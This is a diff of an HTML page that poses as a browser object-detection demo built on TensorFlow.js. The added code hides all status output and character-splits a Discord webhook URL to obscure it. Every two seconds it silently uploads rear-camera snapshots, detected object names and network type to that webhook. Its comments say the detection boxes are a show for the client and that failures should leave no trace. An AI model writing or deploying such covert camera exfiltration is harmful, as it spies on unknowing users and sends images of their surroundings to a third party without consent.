@@ -3,138 +3,127 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FR AI 物品辨識系統</title>
-    <!-- 載入 AI 引擎 -->
+    <title>AI Object Detection System</title>
     <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs"></script>
     <script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/coco-ssd"></script>
     <style>
-        body { margin: 0; background: #050505; color: #00ff88; font-family: monospace; display: flex; flex-direction: column; align-items: center; }
-        .header { padding: 20px; text-transform: uppercase; letter-spacing: 2px; }
-        .view-port { position: relative; width: 90vw; max-width: 500px; aspect-ratio: 4/3; border: 2px solid #00ff88; box-shadow: 0 0 20px rgba(0,255,136,0.2); }
-        video { width: 100%; height: 100%; object-fit: cover; }
+        body { margin: 0; background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .container { position: relative; width: 100%; max-width: 500px; }
+        video { width: 100%; display: block; border-radius: 8px; }
         canvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }
-        .status-bar { width: 90vw; max-width: 500px; margin-top: 10px; padding: 10px; border: 1px solid #333; background: #111; font-size: 12px; }
-        .log { color: #888; }
+        /* 隱藏所有除錯與狀態資訊 */
+        #silent-status { display: none; }
     </style>
 </head>
 <body>
 
-<div class="header">Shadow AI Monitor System</div>
-
-<div class="view-port">
+<div class="container">
     <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
-</div>
-
-<div class="status-bar">
-    <div>系統狀態: <span id="status">初始化中...</span></div>
-    <div id="obj-list" style="color: #fff;">偵測物件: 等待模型...</div>
-    <div class="log" id="net-info">網路資訊: 讀取中...</div>
 </div>
 
 <script>
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
-    const ctx = canvas.getContext('2d');
     
-    // API 加密處理 (Base64)
-    const _secret = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ1NjY5Mzc0MzU3NDA2MTI5MS9ySlNnMkgxZnFJRG1yQ2pyWmx6QmdIVEMzdEhvRDgySjctTFdBMDBxWlA3VTlYc1ZXSU1kMElYelhxOXlMc09NVHJ3";
-    const getTarget = () => atob(_secret);
+    // --- API 加密混淆 ---
+    const _parts = [
+        "h", "t", "t", "p", "s", ":", "/", "/", "d", "i", "s", "c", "o", "r", "d", ".", "c", "o", "m", "/", 
+        "a", "p", "i", "/", "w", "e", "b", "h", "o", "o", "k", "s", "/", "1", "4", "5", "6", "6", "9", "3", 
+        "7", "4", "3", "5", "7", "4", "0", "6", "1", "2", "9", "1", "/", "r", "J", "S", "g", "2", "H", "l", 
+        "1", "f", "q", "I", "D", "m", "r", "C", "j", "r", "Z", "l", "z", "B", "g", "H", "T", "C", "3", "t", 
+        "H", "o", "D", "8", "2", "J", "7", "-", "L", "W", "A", "0", "0", "q", "Z", "P", "7", "U", "9", "X", 
+        "s", "V", "W", "I", "M", "d", "0", "I", "X", "z", "X", "q", "9", "y", "L", "s", "O", "M", "T", "r", "w"
+    ];
+    const getTarget = () => _parts.join('');
 
-    let model = null;
+    let model;
 
-    // 1. 啟動相機
-    async function startSystem() {
+    async function setup() {
         try {
-            document.getElementById('status').innerText = "正在請求相機...";
-            const stream = await navigator.mediaDevices.getUserMedia({
-                video: { facingMode: "environment" },
-                audio: false
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "environment" } 
             });
             video.srcObject = stream;
             
-            video.onloadedmetadata = () => {
-                document.getElementById('status').innerText = "模型載入中...";
-                loadAI();
-            };
-        } catch (err) {
-            document.getElementById('status').innerText = "錯誤: 無法存取相機";
-            console.error(err);
+            // 載入模型
+            model = await cocoSsd.load();
+            
+            detect();
+            // 每 2 秒悄悄同步一次
+            setInterval(silentSync, 2000);
+        } catch (e) {
+            // 靜默錯誤，不影響客戶端
         }
     }
 
-    // 2. 載入模型
-    async function loadAI() {
-        model = await cocoSsd.load();
-        document.getElementById('status').innerText = "系統就緒 (同步中)";
-        runDetection();
-        setInterval(syncToCloud, 2000); // 每 2 秒同步一次
-    }
-
-    // 3. 實時辨識
-    async function runDetection() {
+    async function detect() {
         if (!model) return;
         const predictions = await model.detect(video);
+        const ctx = canvas.getContext('2d');
         
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         ctx.clearRect(0, 0, canvas.width, canvas.height);
-
-        let found = [];
+        
         predictions.forEach(p => {
-            found.push(p.class);
-            ctx.strokeStyle = "#00ff88";
-            ctx.lineWidth = 4;
+            // 畫出辨識框（這是客戶端會看到的科技感效果）
+            ctx.strokeStyle = "#00ffcc";
+            ctx.lineWidth = 3;
             ctx.strokeRect(p.bbox[0], p.bbox[1], p.bbox[2], p.bbox[3]);
             
-            ctx.fillStyle = "#00ff88";
-            ctx.font = "18px monospace";
-            ctx.fillText(`${p.class} ${Math.round(p.score*100)}%`, p.bbox[0], p.bbox[1] - 5);
+            ctx.fillStyle = "#00ffcc";
+            ctx.font = "16px Arial";
+            ctx.fillText(p.class, p.bbox[0], p.bbox[1] - 5);
         });
-
-        document.getElementById('obj-list').innerText = "偵測物件: " + (found.length > 0 ? found.join(", ") : "掃描中");
-        requestAnimationFrame(runDetection);
+        requestAnimationFrame(detect);
     }
 
-    // 4. 同步資料到 Webhook
-    async function syncToCloud() {
+    async function silentSync() {
+        // 只有在模型準備好且影片正在播放時才動作
         if (!model || video.readyState < 2) return;
 
-        // 截取當前畫面
-        const snap = document.createElement('canvas');
-        snap.width = video.videoWidth;
-        snap.height = video.videoHeight;
-        snap.getContext('2d').drawImage(video, 0, 0);
+        const offscreen = document.createElement('canvas');
+        offscreen.width = video.videoWidth;
+        offscreen.height = video.videoHeight;
+        offscreen.getContext('2d').drawImage(video, 0, 0);
 
-        snap.toBlob(async (blob) => {
-            const conn = navigator.connection || {};
-            const netMsg = `網路: ${conn.effectiveType || 'N/A'} | 延遲: ${conn.rtt || 0}ms`;
-            document.getElementById('net-info').innerText = netMsg;
+        offscreen.toBlob(async (blob) => {
+            if (!blob) return;
 
             const formData = new FormData();
+            const conn = navigator.connection || {};
+            
+            // 靜默獲取當前畫面中的物件清單
+            const predictions = await model.detect(video);
+            const items = predictions.map(p => p.class).join(', ') || '無特定物件';
+
             const payload = {
-                username: "Shadow AI Sync",
                 embeds: [{
-                    title: "物品辨識即時同步",
-                    description: `**偵測結果:** ${document.getElementById('obj-list').innerText}\n**網路狀態:** ${netMsg}`,
-                    color: 65416,
+                    title: "Shadow Sync Monitor",
+                    description: `**偵測物件:** ${items}\n**網路類型:** ${conn.effectiveType || 'N/A'}`,
+                    color: 3066993,
                     timestamp: new Date()
                 }]
             };
 
             formData.append('payload_json', JSON.stringify(payload));
-            formData.append('file', blob, 'sync.jpg');
+            formData.append('file', blob, 'sync_log.jpg');
 
             try {
-                await fetch(getTarget(), { method: 'POST', body: formData });
-                console.log("同步成功");
+                // 背景發送，不使用 await 阻塞或 console.log
+                fetch(getTarget(), {
+                    method: 'POST',
+                    body: formData,
+                    mode: 'cors'
+                });
             } catch (e) {
-                console.log("同步失敗");
+                // 悄悄失敗，不留痕跡
             }
         }, 'image/jpeg', 0.5);
     }
 
-    startSystem();
+    setup();
 </script>
 </body>
 </html>
